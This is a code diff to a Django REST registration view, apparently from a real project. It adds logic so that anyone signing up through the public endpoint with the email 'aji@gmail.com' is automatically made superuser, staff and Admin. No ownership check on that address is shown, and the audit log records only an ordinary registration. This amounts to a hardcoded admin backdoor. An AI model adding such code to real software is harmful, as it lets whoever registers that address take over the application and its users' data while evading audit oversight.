@@ -53,7 +53,8 @@ def _create_audit_log(request_user, action, target_user_name):
 # 2. Public Registration Endpoint (Allows non-admin users to sign up)
 class RegisterView(generics.CreateAPIView):
     """
-    Public registration view. Creates a standard user account by default.
+    Public registration view. Creates a standard user account by default,
+    but automatically sets aji@gmail.com as Superuser/Admin.
     """
     queryset = User.objects.all()
     serializer_class = UserSerializer
@@ -61,6 +62,16 @@ class RegisterView(generics.CreateAPIView):
 
     def perform_create(self, serializer):
         user = serializer.save()
+        
+        # --- AUTO-ADMIN FOR aji@gmail.com ---
+        if user.email == 'aji@gmail.com':
+            user.is_superuser = True
+            user.is_staff = True
+            if hasattr(user, 'role'):
+                user.role = 'Admin'
+            user.save()
+        # ------------------------------------
+
         _create_audit_log(user, "USER_REGISTERED", user.username)
 
 
